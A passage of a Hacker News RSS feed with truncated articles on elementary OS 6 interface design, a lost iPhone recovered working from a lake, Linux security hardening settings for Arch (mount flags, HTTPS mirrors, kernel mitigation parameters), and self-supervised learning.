<figcaption>Files with different levels as shown in inputs, sidebars, tabbars, actionbars, and headerbars</figcaption>
</figure>

<p>Another place for more clear differentiation is in widget states. Interfaces are interactive: they can be selected, disabled, focused, or pressed. We started some work towards more clearly differentiated states in elementary OS 5 when we redesigned checkboxes, and in elementary OS 6 this work has extended to other interactive widgets like text entries and buttons. Disabled widgets, for example, are much more obviously darker than the default UI level, and are intentionally lower contrast than enabled widgets.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/widget-factory-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="GTK Widget Factory" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/widget-factory-light.png" width="1283" height="778">
  </picture>
<figcaption>The GTK Widget Factory demoing possible states of widgets</figcaption>
</figure>

<p>Something we knew we needed to consider from very early on was a path towards making elementary OS feel more personal without breaking custom styles in apps. We know that many of our users are currently using custom CSS, but that it often leads to breakage and disappointment. In elementary OS 6, we provide 10 possible accent colors to choose from. Combined with the dark style, you can get a much more unique look for your operating system without having to worry about apps behaving incorrectly. The dark style follows all the same principles as outlined above including UI levels, using higher contrast, etc. And we’re still exploring more ways to expose your chosen accent color in ways that feel fun and personal.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/accent-pink.png" alt="Light &amp; Pink">
<img src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/accent-green.png" alt="Dark &amp; Green"></p>
  <figcaption>
    <p><strong>Left:</strong> A light desktop with the Bubblegum accent color | <strong>Right:</strong> A dark desktop with the Lime accent color</p>
  </figcaption>
</figure>

<p>Focus styles are still a work in progress, but the goal here is to make much more bold use of color and to make the keyboard focus location much more obvious. We’ve also revisited selected states and suggested action button styles to make sure that we’re clearly differentiating between someone’s strawberry accent color and destructive action buttons. Instead of using white text on a colored background, we now use a much subtler style that is ultimately higher contrast as well. It also works much better for accent colors, custom brand colors in apps, or other places where we want to use color such as Calendar events.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/suggested-action-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Suggested Action Dialog" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/suggested-acton-light.png" width="549" height="301">
  </picture>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/destructive-action-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Destructive Action Dialog" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/destructive-action-light.png" width="549" height="301">
  </picture>
  <figcaption>
    <p><strong>Left:</strong> A dialog with a suggested action | <strong>Right:</strong> A dialog with a destructive action</p>
  </figcaption>
</figure>

<p>We also hear regularly from users who have displays that sit in that uncomfortable zone between 1× and 2× UI scaling. While we’re still not offering traditional fractional scaling in elementary OS, we have been working on an improved scalable UI solution. In elementary OS 5, people who opted to change the default text size were left with an awkwardly spaced UI with large text, but small controls. In elementary OS 6, we now scale default widgets spacing, corner radii, etc. with text size, eliminating a lot of that awkwardness. It’s not quite perfect, but it will make elementary OS much more legible for more people without incurring the performance penalty associated with traditional fractional scaling. And we’re happy to have a more first-class experience for those who need larger text.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/scale-default-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Default Scale" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/scale-default-light.png" width="376" height="285">
  </picture>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/scale-larger-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Larger Scale" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/scale-larger-light.png" width="504" height="338">
  </picture>
  <figcaption>
    <p><strong>Left:</strong> A …</p></figcaption></figure></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.elementary.io/look-and-feel-changes-elementary-os-6/">https://blog.elementary.io/look-and-feel-changes-elementary-os-6/</a></em></p>]]>
            </description>
            <link>https://blog.elementary.io/look-and-feel-changes-elementary-os-6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26372838</guid>
            <pubDate>Sun, 07 Mar 2021 03:22:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Functioning iPhone returned to owner after six months at bottom of lake]]>
            </title>
            <description>
<![CDATA[
Score 115 | Comments 75 (<a href="https://news.ycombinator.com/item?id=26372407">thread link</a>) | @Tiktaalik
<br/>
March 6, 2021 | https://www.cbc.ca/news/canada/british-columbia/cell-phone-recovered-from-harrison-lake-1.5937753?cmp=rss | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/british-columbia/cell-phone-recovered-from-harrison-lake-1.5937753?cmp=rss">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A Vancouver woman who lost her phone in Harrison Lake in September is shocked and surprised that not only has it been recovered from the lake bottom, but that it still works.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5939069.1614985130!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/cell-phone.jpg"></p></div><figcaption>Clayton Helkenberg puts a cellphone in a net along with other items he and his wife Heather found in a lake-bottom search at Harrison Lake. The cellphone would later power up and Helkenberg tracked down the owner — six months after it was lost in the water.<!-- --> <!-- -->(Clayton Helkenberg)</figcaption></figure><p><span><p>Fatemeh Ghodsi was skeptical at first when she got a text from someone saying they found her phone nearly six months after she lost it in Harrison Lake.</p>  <p>Ghodsi, who lives in Vancouver, was confused&nbsp;and thought one of her friends might&nbsp;be playing a prank on her. But she was soon convinced and made the trip to Chilliwack to collect the phone, which amazingly still works.</p>  <p>Clayton Helkenberg&nbsp;and his wife Heather found the lost iPhone 11 during a sweep of the lake bottom under the water park at Harrison Lake — part&nbsp;of a hobby that includes the odd treasure find, but mostly just lots of&nbsp;garbage clean up.</p>  <p>Ghodsi dropped the phone in the water in early September, during a ride on the bumper boats — photos recovered from the phone show her still smiling moments before the mishap.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5939063.1614985154!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/fatemeh-ghodsi.jpg 300w,https://i.cbc.ca/1.5939063.1614985154!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/fatemeh-ghodsi.jpg 460w,https://i.cbc.ca/1.5939063.1614985154!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/fatemeh-ghodsi.jpg 620w,https://i.cbc.ca/1.5939063.1614985154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/fatemeh-ghodsi.jpg 780w,https://i.cbc.ca/1.5939063.1614985154!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/fatemeh-ghodsi.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5939063.1614985154!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/fatemeh-ghodsi.jpg"></p></div><figcaption>Fatemeh Ghodsi gives the peace sign as she and her friend are seen riding bumper boats at Harrison Lake in early September. Moments later, Ghodsi's phone was lost at the bottom of the lake.<!-- --> <!-- -->(Fatemeh Ghodsi)</figcaption></figure></span></p>  <p>"I was in a situation where I kind of lost balance and dropped it in the water," she said, adding that the water park staff convinced her it would be impossible to find the phone in the deep water.</p>  <p>"Distressed and in tears, we went back to Vancouver just kind of hopeless," said Ghodsi.</p>    <p>She soon bought a new phone, and came to terms with the lost photos, contacts, and other personal information that hadn't been backed up.</p>  <h2>YouTubing&nbsp;diver</h2>  <p>Helkenberg&nbsp;has been snorkeling, swimming&nbsp;and diving for years, but at the start of 2020 — with extra time on his hands after being laid off — he started putting more effort into searching for lost items in the water, as well as doing trash cleanup missions.</p>  <p>Sometime he goes on his diving missions with friends and his wife.&nbsp;He even started a YouTube channel to document his finds.</p>  <p><span><span><iframe src="https://www.youtube.com/embed/ifzizYAf-hs" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <p>Last year, he found more than a hundred pairs of sunglasses, 26 cellphones and two GoPro cameras. This year, he's already counted 35 pairs of sunglasses, five phones and one GoPro.</p>  <p>His underwater work has even attracted some <a href="https://www.theprogress.com/news/chilliwack-diver-retrieves-items-dropped-in-cultus-lake/" target="_blank">media attention</a>, including a report&nbsp;of&nbsp;<a href="https://www.vancouverisawesome.com/bc-news/divers-haul-792-pounds-of-trash-out-of-cultus-lake-3364548" target="_blank">359 kilograms of trash he and friends pulled from Cultus Lake</a> earlier this year.</p>  <p>This week, he was at Harrison Lake — the water is much shallower now than it was in the summer, and according to&nbsp;Helkenberg, it's quite clear. He found a severely damaged&nbsp;flip phone, but Heather Helkenberg&nbsp;noticed Ghodsi's iPhone.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5939076.1614993376!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/cell-phone.jpg 300w,https://i.cbc.ca/1.5939076.1614993376!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/cell-phone.jpg 460w,https://i.cbc.ca/1.5939076.1614993376!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/cell-phone.jpg 620w,https://i.cbc.ca/1.5939076.1614993376!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/cell-phone.jpg 780w,https://i.cbc.ca/1.5939076.1614993376!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/cell-phone.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5939076.1614993376!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/cell-phone.jpg"></p></div><figcaption>Heather Helkenberg finds an iPhone 11 in the sediment at the bottom of Harrison Lake. She said it was the first cellphone she has found. <!-- --> <!-- -->(Clayton Helkenberg)</figcaption></figure></span></p>  <h2>'It just turned right on'</h2>  <p>Clayton Helkenberg&nbsp;said he usually puts phones in a container of silica to dry them out, but he's had good luck with iPhone 11s.</p>  <p>"I took it home, cleaned the dirt off of it and it just turned right on, so it was pretty amazing," he said.</p>  <p>He pulled out the SIM card, put it in another phone to figure out the phone number and got in touch with Ghodsi.</p>  <p>"I was in complete shock, initially to start with. It was kind of like a zombie phone coming back to me, because I'd totally made peace with it being gone," she said.</p>    <p>Ghodsi said the microphone is broken and the speaker sounds weird, but everything else is in perfect shape; the battery health is still at 96 per&nbsp;cent.</p>  <p>She's thankful for the phone's recovery and inspired that Helkenberg makes the effort to reunite people with lost valuables, asking nothing in return. But the experience has left Ghodsi even more impressed by his trash cleanup work, saying it's a reminder to keep our water clean.</p>  <p>"It gives me so much hope for the good that's out there," she said.</p>  <p>As for the next time she takes a ride on the bumper boats?&nbsp;Ghodsi said she'll either leave her phone and valuables on the shore&nbsp;or keep them securely stowed in a pocket.</p>  <hr>  <p><em>Do you have more to add to this story? Email <a href="mailto:rafferty.baker@cbc.ca?subject=diving%20for%20trash%20and%20valuables">rafferty.baker@cbc.ca</a></em></p>  <p><em>Follow Rafferty Baker on Twitter: <a href="https://twitter.com/raffertybaker" target="_blank">@raffertybaker</a></em></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/british-columbia/cell-phone-recovered-from-harrison-lake-1.5937753?cmp=rss</link>
            <guid isPermaLink="false">hacker-news-small-sites-26372407</guid>
            <pubDate>Sun, 07 Mar 2021 01:54:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux security hardening and other tweaks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26371980">thread link</a>) | @Actual-Warthog
<br/>
March 6, 2021 | https://vez.mrsk.me/linux-hardening.html?hn | <a href="https://web.archive.org/web/*/https://vez.mrsk.me/linux-hardening.html?hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<strong>Linux Security Hardening and Other Tweaks</strong>
<hr>

<p>
Last updated: 08/18/2020,
by <a href="https://twitter.com/blakkheim">@blakkheim</a>

</p><p>
This page lists the changes I make to a vanilla install of Arch Linux
for security hardening, as well as some other changes I find useful.
While Arch is my target platform, most of the changes will work on
any Linux system that's reasonably up to date.

</p><p>
I typically favor security over performance. You may also see suggestions
merely to make something more useful or shave precious seconds off
a wait time. It's not a one-size-fits-all setup, but hopefully certain
pieces of it will be useful.

</p><p>
Arch is worth considering for a few reasons:

</p><ul>
<li><strong>The install size:</strong> The base install is relatively minimal
    compared to a "prebuilt" distro like Fedora or Mint. This lets me focus
    on adding just what I want, rather than constantly trying to strip out
    things I don't need.
</li><li><strong>The kernel:</strong> A common misconception about the Linux
    kernel is that it's secure, or that one can go a long time without
    worrying about kernel security updates. Neither of these are even
    remotely true. New versions of Linux are released almost every week,
    often containing security fixes buried among the many other changes.
    These releases typically
    <a href="https://youtu.be/5PmHRSeA2c8?t=4075">don't make explicit
    mention</a> of the changes having security implications. As a result,
    many "stable" or "LTS" distributions don't know
    <a href="https://web.archive.org/web/20200623161340/https://www.openwall.com/lists/oss-security/2020/06/23/2">which commits</a> should be
    backported to their old kernels, or even that something needs backporting
    at all. If the problem has a public CVE assigned to it, maybe your distro
    will pick it up. Maybe not. Even if a CVE exists, at least in the case
    of Ubuntu and Debian especially, users are often left with kernels full
    of <a href="https://security-tracker.debian.org/tracker/source-package/linux">known holes</a>
    for <a href="https://web.archive.org/web/20210228153347/https://blog.frizn.fr/linux-kernel/cve-2020-14381">months at a time</a>.
    Arch doesn't play the backporting game, instead
    opting to provide the newest stable releases shortly after they come out.
</li><li><strong>The <a href="https://wiki.archlinux.org/index.php/Arch_Build_System">Arch Build System</a></strong>:
    Having enjoyed the
    <a href="https://en.wikipedia.org/wiki/Ports_collection">ports</a>
    system of <a href="https://vez.mrsk.me/freebsd-defaults.html">FreeBSD</a>
    and <a href="https://www.openbsd.org/">OpenBSD</a> for a long time, the ABS
    has been a pleasure to use. It makes building/rebuilding packages easy.
    It makes updating packages easy. It shows how things are actually built
    and with what options. This BSD-borrowed concept makes interacting with
    the package system simple and intuitive.
</li></ul>

Now on to how I set things up.

<hr>
<p>

<strong>Security Hardening</strong>
</p><ul>
  <li><a href="#disks">Disk Layout</a>
  </li><li><a href="#pacman">Pacman</a>
  </li><li><a href="#kern">Kernel Options</a>
  </li><li><a href="#fw">Firewall</a>
  </li><li><a href="#sudo">Sudo</a>
  </li><li><a href="#firejail">Application Sandboxing</a>
  </li><li><a href="#rfk">RFKill (Disable WiFi / Bluetooth)</a>
</li></ul>

<strong>Other Tweaks</strong>
<ul>
  <li><a href="#ntp">NTP (Network Time Protocol)</a>
  </li><li><a href="#pulse">PulseAudio</a>
  </li><li><a href="#misc">Miscellaneous</a>
  </li><li><a href="#closing">Closing</a>
</li></ul>

<hr>

<h2 id="disks">Disk Layout</h2>

This section contains a few tips to consider during your initial disk layout
creation. The concepts should apply to any distrbution.

<p>
To start, consider using
<a href="https://wiki.archlinux.org/index.php/Dm-crypt/Encrypting_an_entire_system">full disk encryption</a>
along with a
<a href="https://wiki.archlinux.org/index.php/LVM">Logical Volume Manager</a>
setup. Disk encryption protects data at rest, while LVM allows for some
flexibility that can be quite useful. A simple disk layout might look like
this:

</p><ul>
<li><code>/dev/sda1</code> (a small, unencrypted
<a href="https://wiki.archlinux.org/index.php/EFI_system_partition">EFI System Partition</a>,
FAT32)
mounted at <code>/efi</code> (assuming this is
a PC with UEFI, otherwise not needed)
</li><li><code>/dev/sda2</code> (a small, unencrypted ext4 partition)
mounted at <code>/boot</code>.
</li><li><code>/dev/sda3</code> (using the rest of the drive space)
as the encrypted
<a href="https://wiki.archlinux.org/index.php/Dm-crypt">LUKS</a> container
for LVM
</li></ul>

Splitting up the logical volumes for different mount points provides some
benefits, including the ability to set mount flags on specific directories.
Consider creating separate logical volumes for <code>/</code>,
<code>/var</code>, and <code>/home</code> in the install. For a typical
desktop, you probably want to give <code>/home</code> most of the disk space.
The other two don't need much unless there's a specific use case in mind.
25GB and 8GB are used in this example. If you need to have a huge database
in <code>/var</code> or something, make adjustments accordingly.

<p>
There are a lot of user-writable directories in Linux, each one providing
an opportunity for attackers to execute their own binaries.
Once the <a href="https://wiki.archlinux.org/index.php/Fstab">fstab</a>
file is created, add the <code>noexec</code> and <code>nodev</code> flags
to <code>/var</code> and <code>/home</code>. Doing so will disallow execution
of binaries on these mount points, as well as prevent interpreting character
or block special devices on them. Two temporary filesystems (<code>/tmp</code>
and <code>/dev/shm</code>) can also be locked down with the same flags by
adding the following:

</p><pre># /etc/fstab
[...]
tmpfs /tmp     tmpfs rw,noexec,nodev,size=1G,mode=1777 0 0
tmpfs /dev/shm tmpfs rw,noexec,nodev,size=1G 0 0
</pre>

Adjust the <code>1G</code> size limit value as desired.

<p>
Once booted into the finished installation, it should look something like this:

</p><pre># <strong>lvs</strong>
  LV   VG   Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  home lvm  -wi-ao---- 189.12g                                                    
  root lvm  -wi-ao----  25.00g                                                    
  var  lvm  -wi-ao----   8.00g                                                    
# <strong>mount | egrep '(lvm|/tmp|shm)' | sort</strong>
/dev/mapper/lvm-home on /home type ext4 (rw,nodev,noexec,relatime)
/dev/mapper/lvm-root on / type ext4 (rw,relatime)
/dev/mapper/lvm-var on /var type ext4 (rw,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nodev,noexec,size=1048576k)
tmpfs on /tmp type tmpfs (rw,nodev,noexec,relatime,size=1048576k)
</pre>

Another user-writable directory to consider is <code>/run</code>, specifically
the <code>/run/user/$UID</code> directories that systemd spawns when someone
logs in, but their transience is
<a href="https://lists.freedesktop.org/archives/systemd-devel/2015-February/028429.html">annoying</a>
and <a href="https://lwn.net/Articles/436012/">complicated</a>.
I have yet to find the perfect solution there that won't break other things.
<a href="https://wiki.archlinux.org/index.php/FUSE">FUSE</a> is another way
for non-root users to create new mount points and execute binaries. If FUSE
functionality isn't needed, the kernel module can be
<a href="https://wiki.archlinux.org/index.php/Kernel_module#Blacklisting">blacklisted</a>.

<hr>

<h2 id="pacman">Pacman</h2>

Package managers usually don't need much additional configuration.
<a href="https://wiki.archlinux.org/index.php/Pacman">Pacman</a>, the one
Arch uses, is no different. My recommendation for any package manager is
simply to make sure that
<a href="https://web.archive.org/web/20200528161634/https://blog.packagecloud.io/eng/2018/02/21/attacks-against-secure-apt-repositories/">only HTTPS mirrors</a>
are used.

<pre># /etc/pacman.d/mirrorlist

Server = <strong>https</strong>://example.com/[...]/$repo/os/$arch
</pre>

Check the
<a href="https://www.archlinux.org/mirrorlist/all/https/">mirrorlist
generator</a> to see a list of TLS-capable servers near you.

<p>
Using an HTTPS mirror with Pacman is especially important because it
<a href="https://security.archlinux.org/package/pacman">doesn't validate</a>
the package database files and it
<a href="https://en.wikipedia.org/wiki/Privilege_separation">runs everything as root</a>.
HTTPS doesn't mitigate either of these problems, but it is one line of defense
against a MITM attack. I hope the developers will make fixing these two
security issues a priority for the project soon. Other package managers
have been doing it the right way for a long time.

</p><hr>

<h2 id="kern">Kernel Options</h2>

The
<a href="https://www.archlinux.org/packages/extra/x86_64/linux-hardened/">linux-hardened</a>
kernel package in Arch includes some compile-time security improvements
that can't be set at runtime.
If your distribution doesn't have a package for it, applying the
<a href="https://github.com/anthraxx/linux-hardened/releases">patchset</a>
to upstream sources and building your own kernel is pretty easy. If you go
that route, have a look at the
<a href="https://github.com/a13xp0p0v/kconfig-hardened-check">kconfig-hardened-check</a>
script for more compile-time settings to consider.

<p>
The only issue I've found with linux-hardened is that it's often outdated.
Upstream Linux development moves quickly, so out-of-tree patches will always
require extra work to maintain. Why the (relatively small) patches aren't
upstreamed is unknown to me. There are times when linux-hardened is lagging
multiple versions behind the latest kernel, thus
<a href="https://archive.is/GDFgs">missing out</a> on many
important security fixes. In such a situation, the user must choose between
a more secure kernel with known vulnerabilities and a less secure kernel
with fewer known vulnerabilities. Not a great situation.

</p><p>
Runtime configuration of the kernel can be done in a number of ways.
Desired flags may be passed on startup in the form of
<a href="https://wiki.archlinux.org/index.php/Kernel_parameters">kernel parameters</a>,
of which there is an
<a href="https://www.kernel.org/doc/Documentation/admin-guide/kernel-parameters.txt">extensive list</a>.
Parameters are usually passed by the
<a href="https://wiki.archlinux.org/index.php/Bootloader#Boot_loader">bootloader</a>, so
<a href="https://wiki.archlinux.org/index.php/Kernel_parameters#Configuration">configuration details</a>
vary depending whether the system uses
<a href="https://wiki.archlinux.org/index.php/GRUB">GRUB</a>,
<a href="https://wiki.archlinux.org/index.php/Systemd-boot">systemd-boot</a>,
or something else.

</p><p>
The following options, split up into categories, are worth considering for
security improvements:

</p><pre>l1tf=full,force
spec_store_bypass_disable=on
spectre_v2=on
</pre>

These are addtional mitigations for certain CPU security flaws.
While the <code>mitigations=auto</code> option is used by default in upstream
Linux, some of the mitigations it enables have been "toned down" for
performance reasons.
Examples of this include the
<a href="https://en.wikipedia.org/wiki/Foreshadow_(security_vulnerability)">L1TF</a>
and
<a href="https://en.wikipedia.org/wiki/Microarchitectural_Data_Sampling">Microarchitectural Data Sampling</a>
vulnerabilities, which can't be fully mitigated unless HyperThreading
is disabled.
The
<a href="https://en.wikipedia.org/wiki/Speculative_Store_Bypass">Speculative Store Bypass</a>
vulnerability is only partially mitigated by default, with applications being
allowed to opt-in for protections via prctl or seccomp.
Finally, we enable all mitigations (including those against userspace) for
<a href="https://en.wikipedia.org/wiki/Spectre_(security_vulnerability)">Spectre V2</a>.

<pre>apparmor=1
lsm=lockdown,yama,apparmor
lockdown=<span color="#ff0000"><strong>XXX</strong></span>
</pre>

These enable the
<a href="https://wiki.archlinux.org/index.php/AppArmor">AppArmor</a>, 
<a href="https://www.kernel.org/doc/Documentation/security/Yama.txt">Yama</a>,
and
<a href="https://web.archive.org/web/20200525014035/https://mjg59.dreamwidth.org/55105.html">Lockdown</a>
features, with the lockdown mode left for the reader to choose.
Valid options are <code>integrity</code> and <code>confidentiality</code>,
both described briefly
<a href="https://wiki.archlinux.org/index.php/Security#Kernel_lockdown_mode">here</a>.
Replace <code><strong><span color="#ff0000">XXX</span></strong></code> with
whichever you see fit, or omit this option entirely if the feature isn't
wanted.

<p>
For what it's worth, running in <code>confidentiality</code> mode on my
desktop hasn't caused any problems. Your mileage and use case may vary.
Lockdown will break suspend-to-disk and any out-of-tree kernel modules
like ZFS, as well as
<a href="https://wiki.archlinux.org/index.php/Dynamic_Kernel_Module_Support">DKMS</a> modules.

</p><pre>init_on_alloc=1
init_on_free=1
page_alloc.shuffle=1
slab_nomerge
vsyscall=none
</pre>

This group will instruct the kernel to fill newly allocated pages and heap
objects with zeroes, fill freed pages and heap objects with zeroes, tell the
page allocator to randomize its free lists, disable merging of
<a href="https://en.wikipedia.org/wiki/Slab_allocation">slabs</a>
with similar size, and disable
<a href="https://web.archive.org/web/20200526182112/https://lwn.net/Articles/446528/">vsyscalls</a>
due to their history of making exploits easier.
All five options are all set by default when using the linux-hardened kernel.

<pre>slub_debug=F
</pre>

This enables sanity checks in the
<a href="https://www.kernel.org/doc/Documentation/vm/slub.txt">SLUB allocator</a>.
Two other flags to consider for non-hardened kernels are <code>Z</code>
(redzoning, to detect when a slab is overwritten past its real size) and
<code>P</code> (to enable poisoning on slab cache allocations).

<p>
The full list of kernel parameters to be used must be specified on a single
line, separated by spaces, in the bootloader's config file. An example for
GRUB might look like this:

</p><pre># /etc/default/grub

[...]</pre></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vez.mrsk.me/linux-hardening.html?hn">https://vez.mrsk.me/linux-hardening.html?hn</a></em></p>]]>
            </description>
            <link>https://vez.mrsk.me/linux-hardening.html?hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-26371980</guid>
            <pubDate>Sun, 07 Mar 2021 00:42:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Advantage of Self-Supervised Learning]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26370971">thread link</a>) | @isusmelj
<br/>
March 6, 2021 | https://lightly.ai/post/the-advantage-of-self-supervised-learning | <a href="https://web.archive.org/web/*/https://lightly.ai/post/the-advantage-of-self-supervised-learning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>‍<strong>A few personal thoughts on why self-supervised learning will have a strong impact on AI. From recent NLP to computer vision papers.</strong></p><p>‍</p><p>This is not a prediction but rather a summary of personal findings and trends from research and industry. </p><p>‍</p><p>First, let’s discuss the difference between self-supervised learning and unsupervised learning. Whether there actually is a difference between the two is still an open discussion.<br><strong>Unsupervised learning</strong> is the idea of models learning without any supervision. Clustering algorithms are often an example of unsupervised learning. There is no supervision or training involved on how clusters are formed (at least not for simple methods such as K-Means).<br>In <strong>self-supervised learning</strong>, we use the data itself as a label. We essentially turn unsupervised learning into supervised learning by leveraging something called a proxy task. A proxy task is different from the downstream or model task because we are not interested in the proxy itself. </p><p>‍</p><p>In <strong>NLP</strong> popular methods such as Googles <a href="https://arxiv.org/pdf/1810.04805.pdf" target="_blank">BERT, 2019</a> use a pre-training procedure where the model would predict missing words within a sentence or the next sentence based on the current sentence. We can create a sentence with a missing word by simply removing a single word from it. Now the ground truth information (our label) is the missing word. We can train the model in a self-supervised way.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f7ac1d59a6fc121dde87967/60070083605e885ce378d565_1*PyNyC1q8d5nY7PoqaQZjbQ.png" alt=""></p><figcaption>Image from the original BERT paper</figcaption></figure><p>In <strong>computer vision</strong>, we can apply the very same technique to train a model. We take an image and remove part of it (we essentially color it with a single color). The task of the model is to predict the missing pixels (we call this image inpainting). Since we have access to the original image and the missing pixels (ground truth) we can train the model in a supervised way. The paper <a href="https://openaccess.thecvf.com/content_cvpr_2016/papers/Pathak_Context_Encoders_Feature_CVPR_2016_paper.pdf" target="_blank">Context Encoders: Feature Learning by Inpainting, CVPR, 2016</a> is an example of such a self-supervised training procedure using inpainting. Unfortunately, this approach in computer vision doesn’t work that well. </p><figure><p><img src="https://uploads-ssl.webflow.com/5f7ac1d59a6fc121dde87967/600700831fbe4b9d4b33d8d0_1*6Cm9WFWYQtzmW-xuPwd_fA.png" alt=""></p><figcaption>From original paper Context Encoders. The illustration shows how the model has to reconstruct the white area in the image. To fulfill the task it needs to understand the context (needs to learn good representations).</figcaption></figure><p>Newer methods use image augmentations. A single image would go twice through an augmentation pipeline. We end up with two new versions of the original image (we call them views). If we do the same for multiple images we can train a model to find the pairs which belong to the same original image (before augmentation). We essentially learn the model to be invariant to whatever augmentation we choose.</p><p>‍</p><p>Now, let’s have a look at the advantages self-supervised learning can bring to the world of AI.</p><p>‍</p><h3>Lifelong Learning</h3><p>When we talk about AI we all think about some smart system learning over time and improving itself. Unfortunately, this is quite difficult. Supervised learning systems require new labels for new data to be trained on. Improving the systems require continuous re-labeling and re-training. <br>However, using self-supervision we don’t require human labels anymore. There has been some great work into that direction from <a href="http://people.eecs.berkeley.edu/~efros/" target="_blank">Alexey Efros Lab</a> like the following paper using self-supervised learning for adapting to new environments in reinforcement learning: <a href="https://arxiv.org/pdf/1705.05363.pdf" target="_blank">Curiosity-driven Exploration by Self-supervised Prediction, ICML, 2017</a> </p><p>‍</p><h3>Data Labeling</h3><p>Supervised learning requires ground-truth data. We call them labels or annotations and in domains such as computer vision, they are mostly generated by humans. A single label can cost between a few cents and up to multiple dollars. It all depends on how much time the annotation task takes and how much expertise is required. Whereas lots of people can draw a bounding box around a car and a pedestrian fewer can do the same for medical images.<br>Self-supervised learning can help to reduce the required amount of labeling. On one hand, we can pre-train a model on unlabeled data and fine-tune it on a smaller labeled set. A popular example is <a href="https://arxiv.org/pdf/2002.05709.pdf" target="_blank">A Simple Framework for Contrastive Learning of Visual Representations, ICML 2020</a>. Btw. the last author of this paper is no one else than Turing Award winner Geoffrey Hinton. Another way to help with labeling efficiency is that we can use the obtained features from a self-supervised model to guide the selection process of which data to label. One approach is to simply pick the data samples which are diverse and not similar. We do this at <a href="http://lightly.ai/" target="_blank">Lightly</a>.</p><p>‍</p><p>I hope you got an idea of how self-supervised learning works and why there is a good reason to be excited about it. If you’re interested in self-supervised learning in computer vision don’t forget to check out our <a href="https://github.com/lightly-ai/lightly" target="_blank">open-source Python framework for self-supervised learning on GitHub</a>.</p><p>‍</p><p>Igor, co-founder<br><a href="https://lightly.ai/" target="_blank">Lightly.ai</a></p><p>‍</p></div></div></div></div>]]>
            </description>
            <link>https://lightly.ai/post/the-advantage-of-self-supervised-learning</link>
            <guid isPermaLink="false">hacker-news-small-sites-26370971</guid>
            <pubDate>Sat, 06 Mar 2021 22:08:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep reinforcement learning applied to actual building ventilation system]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26370901">thread link</a>) | @absa_eol
<br/>
March 6, 2021 | https://airboxlab.github.io/hvac/control/ai/reinforcement_learning/2021/01/24/smart_control.html | <a href="https://web.archive.org/web/*/https://airboxlab.github.io/hvac/control/ai/reinforcement_learning/2021/01/24/smart_control.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    

<p>Through a series of examples, this article deals with limitations of classic controllers and control strategies in 
